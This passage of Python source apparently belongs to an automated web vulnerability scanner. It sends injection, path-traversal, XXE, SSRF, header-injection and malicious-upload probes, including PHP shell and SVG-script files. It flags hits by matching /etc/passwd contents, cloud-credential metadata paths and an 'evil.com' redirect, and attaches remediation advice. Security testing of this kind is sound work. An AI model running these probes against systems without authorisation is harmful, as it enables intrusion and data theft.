            elif path == "/metrics":
                if any(k in body for k in ("process_", "http_requests", "nodejs_", "go_")):
                    return self.finding(
                        title="Prometheus Metrics Endpoint Publicly Exposed (A06)",
                        description=f"Metrics at {url} expose internal telemetry (request counts, memory, CPU).",
                        severity=Severity.MEDIUM,
                        mitre_id="T1592",
                        evidence=f"GET {url} → HTTP {status}. Metrics present.",
                        remediation="Restrict /metrics to monitoring systems. Require auth or firewall rule.",
                    )
            elif path in ("/support/logs", "/encryptionkeys/"):
                return self.finding(
                    title=f"Sensitive Path Exposed: {path} (A01)",
                    description=f"{url} returned HTTP 200 with content — possibly sensitive logs or keys.",
                    severity=Severity.HIGH,
                    mitre_id="T1083",
                    evidence=f"GET {url} → HTTP {status}. Body: {body[:200]}",
                    remediation="Restrict access with authentication. Remove from public web path.",
                )
            elif path == "/rest/admin/application-configuration":
                return self.finding(
                    title="Admin Application Config Endpoint Exposed (A01)",
                    description=f"Admin configuration at {url} is accessible.",
                    severity=Severity.HIGH,
                    mitre_id="T1592",
                    evidence=f"GET {url} → HTTP {status}. Body: {body[:300]}",
                    remediation="Restrict admin config endpoints to Administrator role.",
                )
            elif path == "/robots.txt":
                disallowed = re.findall(r"Disallow:\s*(.+)", body)
                if disallowed:
                    return self.finding(
                        title="Robots.txt Discloses Hidden Paths (A06)",
                        description=(
                            f"robots.txt reveals {len(disallowed)} disallowed path(s) that "
                            "should be secret — security-by-obscurity via robots.txt is ineffective."
                        ),
                        severity=Severity.LOW,
                        mitre_id="T1592",
                        evidence=f"Disallowed paths: {disallowed[:10]}",
                        remediation=(
                            "Do not rely on robots.txt to hide sensitive paths. "
                            "Enforce access controls on the server side."
                        ),
                    )
            return None

        tasks   = [probe(p) for p in SENSITIVE_PATHS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A03 — Parameter injection (XSS, SQLi, CMD, Path Traversal)
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_param_injection(
        self,
        session,
        sem,
        url: str,
        param: str,
        auth_headers: dict,
    ) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        base_url = url.split("?")[0]

        tests = [
            ("XSS",           XSS_PAYLOADS[:3],           self._check_xss_response,            Severity.HIGH),
            ("SQLi",          SQLI_PAYLOADS[:4],           self._check_sqli_response,           Severity.CRITICAL),
            ("CMD",           CMD_INJECTION_PAYLOADS[:3],  self._check_cmd_response,            Severity.CRITICAL),
            ("PathTraversal", PATH_TRAVERSAL_PAYLOADS[:2], self._check_path_traversal_response, Severity.CRITICAL),
        ]

        for test_name, payloads, check_func, severity in tests:
            probe_urls = [
                base_url + "?" + urlencode({param: p}) for p in payloads
            ]

            async def timed_get(u: str, ah: dict = auth_headers):
                start = time.monotonic()
                r     = await self._get(session, sem, u, auth_headers=ah)
                elapsed = time.monotonic() - start
                if r is None:
                    return None
                return r + (elapsed,)

            responses = await asyncio.gather(
                *[timed_get(u) for u in probe_urls], return_exceptions=True
            )

            for payload, resp in zip(payloads, responses):
                if isinstance(resp, Exception) or resp is None:
                    continue
                status, resp_headers, body, elapsed = resp
                content_type = resp_headers.get("Content-Type", "")

                if test_name == "SQLi":
                    is_vuln = await check_func(payload, body, status, elapsed)
                elif test_name == "XSS":
                    is_vuln = await check_func(
                        payload, body, status, content_type=content_type
                    )
                else:
                    is_vuln = await check_func(payload, body, status)

                if is_vuln:
                    await self.emit_event(
                        "INFO",
                        f"[VULNERABILITY] {test_name} confirmed in '{param}' at {base_url}",
                    )
                    findings.append(self.finding(
                        title=f"{test_name} in Parameter '{param}' (A03)",
                        description=(
                            f"Parameter '{param}' at {base_url} is vulnerable to {test_name}."
                        ),
                        severity=severity,
                        mitre_id=self._get_mitre(test_name),
                        evidence=(
                            f"Payload: {payload}\n"
                            f"URL: {base_url}?{param}=...\n"
                            f"Content-Type: {content_type}"
                        ),
                        remediation=self._get_remediation(test_name),
                        raw_data={"param": param, "payload": payload, "url": base_url},
                    ))
                    break  # one finding per test type per param

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # Response checkers (false-positive hardened)
    # ─────────────────────────────────────────────────────────────────────────

    async def _check_xss_response(
        self, payload: str, body: str, status: int, content_type: str = ""
    ) -> bool:
        # ONLY flag XSS on HTML responses.  JSON/JS/binary = not exploitable.
        ct = content_type.lower()
        if "application/json" in ct:
            return False
        if "javascript" in ct:
            return False
        if "text/javascript" in ct:
            return False
        return payload in body

    async def _check_sqli_response(
        self, payload: str, body: str, status: int, elapsed: float = 0.0
    ) -> bool:
        # Time-based blind SQLi
        if any(k in payload.lower() for k in ("sleep", "waitfor", "pg_sleep")):
            if elapsed > 4.5:
                return True
        # Error-based
        return any(re.search(p, body, re.IGNORECASE) for p in SQLI_ERROR_PATTERNS)

    async def _check_cmd_response(
        self, payload: str, body: str, status: int
    ) -> bool:
        # Must match a REAL command output pattern — not just "uid=" in JS source
        return bool(CMD_EXEC_PATTERN.search(body))

    async def _check_path_traversal_response(
        self, payload: str, body: str, status: int
    ) -> bool:
        if "root:" in body and "/bin/" in body:
            return True
        if "Windows" in body and "[boot loader]" in body:
            return True
        return False

    # ─────────────────────────────────────────────────────────────────────────
    # A03 — Path traversal on URL path segment
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_path_traversal_path(
        self, session, sem, url: str, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        parsed = urlparse(url)

        for payload in PATH_TRAVERSAL_PAYLOADS[:2]:
            new_path = parsed.path.rstrip("/") + "/" + payload
            new_url  = parsed._replace(path=new_path).geturl()
            resp     = await self._get(session, sem, new_url, auth_headers=auth_headers)
            if resp and "root:" in resp[2] and "/bin/" in resp[2]:
                findings.append(self.finding(
                    title="Path Traversal via URL Path Segment (A01/A03)",
                    description="Path traversal in URL path — /etc/passwd content returned.",
                    severity=Severity.CRITICAL,
                    mitre_id="T1083",
                    evidence=f"Payload: {payload}\nURL: {new_url}",
                    remediation="Validate and canonicalize file paths. Never construct paths from URL segments.",
                ))
                break
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A03 — HTML Form testing
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_forms(
        self, session, sem, url: str, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings
        resp = await self._get(session, sem, url, auth_headers=auth_headers)
        if not resp:
            return findings
        _, _, body = resp
        forms  = re.findall(
            r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>', body, re.IGNORECASE
        )
        inputs = re.findall(
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', body, re.IGNORECASE
        )
        if not forms or not inputs:
            return findings
        form_url = urljoin(url, forms[0])
        tasks    = [
            self._test_param_injection(session, sem, form_url, p, auth_headers)
            for p in inputs[:5]
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, list):
                findings.extend(r)
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A08 — File upload
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_file_upload_once(
        self, session, sem, target: str, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        upload_urls = [
            urljoin(target, "/file-upload"),
            urljoin(target, "/profile/image/file"),
            urljoin(target, "/api/upload"),
            urljoin(target, "/upload"),
        ]

        async def try_upload(upload_url: str, fname: str, content: str, mime: str):
            async with sem:
                data = aiohttp.FormData()
                data.add_field(
                    "file", content, filename=fname, content_type=mime
                )
                try:
                    hdrs = {**auth_headers}
                    async with session.post(
                        upload_url, data=data, headers=hdrs, allow_redirects=False
                    ) as resp:
                        body = await resp.text(errors="replace")
                        is_php = fname.endswith((".php", ".phtml", ".php5"))
                        php_executed = any(
                            i in body for i in [
                                "<?php", "PHP Parse error",
                                "system(", "exec(", "pwned",
                            ]
                        )
                        if resp.status in (200, 201) and is_php and (
                            php_executed or "success" in body.lower()
                        ):
                            return self.finding(
                                title="Malicious File Upload Accepted — PHP Shell (A08)",
                                description=(
                                    f"Upload endpoint at {upload_url} accepted a PHP executable file. "
                                    "If accessible via URL, this is Remote Code Execution."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1190",
                                evidence=(
                                    f"Uploaded {fname} → HTTP {resp.status}. "
                                    f"Body: {body[:200]}"
                                ),
                                remediation=(
                                    "Validate file type using magic bytes (not extension). "
                                    "Store uploads outside webroot. Use a CDN/object store."
                                ),
                            )
                        # SVG with embedded script
                        if fname.endswith(".svg") and resp.status in (200, 201) and (
                            "success" in body.lower() or "filename" in body.lower()
                        ):
                            return self.finding(
                                title="SVG Upload Accepted — Potential Stored XSS (A08)",
                                description=(
                                    f"SVG file with embedded <script> tag accepted at {upload_url}. "
                                    "SVG files execute JavaScript when served as text/html."
                                ),
                                severity=Severity.HIGH,
                                mitre_id="T1059.007",
                                evidence=f"Uploaded {fname} (SVG+script) → HTTP {resp.status}",
                                remediation=(
                                    "Sanitize SVG files on upload; strip <script> tags. "
                                    "Serve with Content-Disposition: attachment."
                                ),
                            )
                except Exception:
                    return None
            return None

        tasks   = [
            try_upload(u, fname, content, mime)
            for u in upload_urls
            for fname, content, mime in FILE_UPLOAD_PAYLOADS
        ]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A03 — XXE
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_xxe_once(
        self, session, sem, target: str, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        xml_urls = [
            urljoin(target, "/api"),
            urljoin(target, "/xml"),
            urljoin(target, "/soap"),
            urljoin(target, "/rest"),
        ]

        async def try_xxe(xml_url: str, payload: str):
            async with sem:
                hdrs = {**auth_headers, "Content-Type": "application/xml"}
                try:
                    async with session.post(
                        xml_url, data=payload, headers=hdrs
                    ) as resp:
                        body = await resp.text(errors="replace")
                        if ("root:" in body and "/bin/" in body) or "etc/hostname" in body:
                            return self.finding(
                                title="XML External Entity (XXE) Injection (A03)",
                                description=(
                                    f"XML endpoint at {xml_url} processed external entities — "
                                    "server filesystem content returned in response."
                                ),
                                severity=Severity.CRITICAL,
                                mitre_id="T1190",
                                evidence=f"XXE payload response: {body[:300]}",
                                remediation=(
                                    "Disable external entity processing. "
                                    "Use defusedxml (Python) or equivalent safe XML library."
                                ),
                            )
                except Exception:
                    return None
            return None

        tasks   = [try_xxe(u, p) for u in xml_urls for p in XXE_PAYLOADS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A05 — Header injection
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_header_injection(
        self, session, sem, url: str
    ) -> List[Finding]:
        findings: List[Finding] = []
        if _is_static_asset(url):
            return findings

        async def try_header(header: str, payload: str):
            async with sem:
                hdrs = {"User-Agent": "SecureForge-BAS/2.0", header: payload}
                try:
                    async with session.get(
                        url, headers=hdrs, allow_redirects=False
                    ) as resp:
                        resp_hdr_str = str(dict(resp.headers))
                        injected = payload in resp_hdr_str
                        crlf = (
                            "\r\n" in payload
                            and payload.split("\r\n")[1].split(":")[0].strip()
                            in resp_hdr_str
                        )
                        if injected or crlf:
                            return self.finding(
                                title=f"Header Injection — {header} (A05)",
                                description=(
                                    f"Header '{header}' value is reflected back into "
                                    "response headers, confirming injection."
                                ),
                                severity=Severity.HIGH,
                                mitre_id="T1190",
                                evidence=(
                                    f"Injected {header}: {payload[:80]} "
                                    "→ reflected in response headers."
                                ),
                                remediation=(
                                    "Sanitize and validate all headers before including in responses. "
                                    "Strip CR/LF characters from header values."
                                ),
                            )
                except Exception:
                    return None
            return None

        tasks   = [try_header(h, p) for h, p in HEADER_INJECTION_PAYLOADS.items()]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A01 — Open Redirect
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_open_redirect(
        self, session, sem, url: str, query: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        param = next((p for p in REDIRECT_PARAMS if p in query), None)
        if not param:
            return findings

        for payload in OPEN_REDIRECT_PAYLOADS:
            new_q   = {k: (v[0] if isinstance(v, list) else v) for k, v in query.items()}
            new_q[param] = payload
            new_url = urlparse(url)._replace(query=urlencode(new_q)).geturl()
            resp    = await self._get(session, sem, new_url, allow_redirects=False)
            if resp:
                location = resp[1].get("Location", "")
                if payload in location and "evil.com" in location:
                    findings.append(self.finding(
                        title=f"Open Redirect via '{param}' (A01)",
                        description=(
                            f"Parameter '{param}' allows open redirect to an external domain."
                        ),
                        severity=Severity.MEDIUM,
                        mitre_id="T1190",
                        evidence=f"Payload: {payload} → Location: {location}",
                        remediation=(
                            "Validate redirect targets against an allowlist. "
                            "Never reflect raw user input in Location headers."
                        ),
                    ))
                    break
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A10 — SSRF
    # ─────────────────────────────────────────────────────────────────────────

    async def _test_ssrf(
        self, session, sem, url: str, query: dict, auth_headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []
        param = next(
            (p for p in SSRF_PARAMS if p in query), next(iter(query), None)
        )
        if not param:
            return findings

        async def try_ssrf(payload: str):
            if _is_internal_url(payload):
                return None  # Safety gate — never fire internal addresses
            new_q   = {k: (v[0] if isinstance(v, list) else v) for k, v in query.items()}
            new_q[param] = payload
            new_url = urlparse(url)._replace(query=urlencode(new_q)).geturl()
            resp    = await self._get(session, sem, new_url, auth_headers=auth_headers)
            if resp:
                body = resp[2]
                if any(
                    k in body for k in (
                        "169.254.169.254", "ami-id", "instance-id",
                        "computeMetadata", "iam/security-credentials",
                    )
                ):
                    return self.finding(
                        title=f"Server-Side Request Forgery (SSRF) via '{param}' (A10)",
                        description=(
                            f"Parameter '{param}' fetched an internal/cloud metadata URL "
                            "and returned IMDS content in the response."
                        ),
                        severity=Severity.CRITICAL,
                        mitre_id="T1190",
                        evidence=f"Payload: {payload}\nURL: {new_url}\nBody: {body[:200]}",
                        remediation=(
                            "Validate and restrict URL schemes/hosts. "
                            "Block access to 169.254.0.0/16 (cloud metadata). "
                            "Use IMDSv2 (AWS) to require session tokens."
                        ),
                    )
            return None

        results = await asyncio.gather(
            *[try_ssrf(p) for p in SSRF_PAYLOADS], return_exceptions=True
        )
        for r in results:
            if r and not isinstance(r, Exception):
                findings.append(r)
                break
        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # A02 / A05 — Response header analysis
    # ─────────────────────────────────────────────────────────────────────────

    async def _check_headers(
        self, target: str, headers: dict
    ) -> List[Finding]:
        findings: List[Finding] = []

        # Server version disclosure
        server = headers.get("Server", "")
        if server and re.search(r"\d+\.\d+", server):
            findings.append(self.finding(
                title="Server Version Disclosed (A06)",
                description=f"Server header reveals exact version: {server}",
                severity=Severity.LOW,
                mitre_id="T1592",
                evidence=f"Server: {server}",
                remediation="Configure web server to omit version from Server header.",
            ))

        # Technology stack disclosure
        xpb = headers.get("X-Powered-By", "")
        if xpb:
            findings.append(self.finding(
                title="X-Powered-By Header Exposes Tech Stack (A06)",
                description=f"X-Powered-By: {xpb} — technology fingerprint disclosed.",
                severity=Severity.LOW,
                mitre_id="T1592",
                evidence=f"X-Powered-By: {xpb}",
                remediation="Remove X-Powered-By header (app.disable('x-powered-by') in Express).",
            ))

        # Missing security headers
        required = [
            "X-Frame-Options",
            "X-Content-Type-Options",
            "Content-Security-Policy",
            "Strict-Transport-Security",
            "Referrer-Policy",
            "Permissions-Policy",
        ]
        missing = [h for h in required if h not in headers]
        if missing:
            findings.append(self.finding(
                title="Missing Security Headers (A05)",
                description=f"Missing: {', '.join(missing)}",
                severity=Severity.MEDIUM,
                mitre_id="T1190",
                evidence=f"Missing headers: {missing}",
                remediation=(
                    "Add missing headers using Helmet.js (Node) or "
                    "SecurityMiddleware (Django/Flask)."
                ),
            ))

        # Debug headers
        if any(h in headers for h in ("X-Error-Details", "X-Debug", "X-Stack-Trace")):
            findings.append(self.finding(
                title="Debug / Error Headers Exposed (A05)",
                description="Response contains debug headers that leak internal application details.",
                severity=Severity.MEDIUM,
                mitre_id="T1592",
                evidence=str({k: v for k, v in headers.items() if "debug" in k.lower() or "error" in k.lower()}),
                remediation="Disable debug headers in production configuration.",
            ))

        # Plain HTTP
        if target.startswith("http://"):
            findings.append(self.finding(
                title="HTTP Only — No TLS Encryption (A02)",
                description=(
                    "Service is served over plain HTTP. "
                    "All traffic (including credentials) is transmitted in cleartext."
                ),
                severity=Severity.HIGH,
                mitre_id="T1557",
                evidence=f"URL: {target}",
                remediation=(
                    "Enforce HTTPS with HSTS. Redirect all HTTP to HTTPS. "
                    "Set Secure flag on all cookies."
                ),
            ))

        return findings

    # ─────────────────────────────────────────────────────────────────────────
    # HTTP helper
    # ─────────────────────────────────────────────────────────────────────────

    async def _get(
        self,
        session,
        sem,
        url: str,
        allow_redirects: bool = True,
        auth_headers: dict = None,
    ) -> Optional[tuple]:
        async with sem:
            try:
                hdrs = auth_headers or {}
                async with session.get(
                    url, headers=hdrs,
                    allow_redirects=allow_redirects,
                    ssl=False,
                ) as resp:
                    body = await resp.text(errors="replace")
                    return resp.status, dict(resp.headers), body
            except Exception as exc:
                self.logger.debug(f"GET {url} failed: {exc}")
                return None

    # ─────────────────────────────────────────────────────────────────────────
    # MITRE / Remediation maps
    # ─────────────────────────────────────────────────────────────────────────

    def _get_mitre(self, test_name: str) -> str:
        return {
            "XSS":           "T1059.007",
            "SQLi":          "T1190",
            "CMD":           "T1203",
            "PathTraversal": "T1083",
            "XXE":           "T1190",
            "SSRF":          "T1190",
            "OpenRedirect":  "T1190",
            "FileUpload":    "T1190",
            "AuthBypass":    "T1078",
            "SSTI":          "T1059",
            "IDOR":          "T1087",
            "MassAssignment":"T1548",
            "NoSQLi":        "T1190",
        }.get(test_name, "T1190")

    def _get_remediation(self, test_name: str) -> str:
        return {
            "XSS":           "Encode all user output; implement strict Content-Security-Policy.",
            "SQLi":          "Use parameterized queries / ORMs. Validate all input types.",
            "CMD":           "Avoid system calls with user input. Use safe, sandboxed APIs.",
            "PathTraversal": "Validate and canonicalize file paths. Use allowlists — not denylist.",
            "XXE":           "Disable external entity processing. Use defusedxml / safe XML parsers.",
            "SSRF":          "Validate and restrict URL schemes/hosts. Block cloud metadata endpoints.",
            "OpenRedirect":  "Validate redirect targets against a server-side allowlist.",
            "FileUpload":    "Validate file by magic bytes (not extension). Store outside webroot.",
            "AuthBypass":    "Enforce strong authentication; require MFA for all privileged actions.",
            "SSTI":          "Never pass user input to template engines. Use sandboxed rendering.",
            "IDOR":          "Enforce object-level authorization on every request. Verify resource ownership.",
            "MassAssignment":"Use DTOs / field allowlists. Never bind raw request body to models.",
            "NoSQLi":        "Validate input types; reject operator objects in query fields.",
        }.get(test_name, "Apply security best practices and defence-in-depth.")
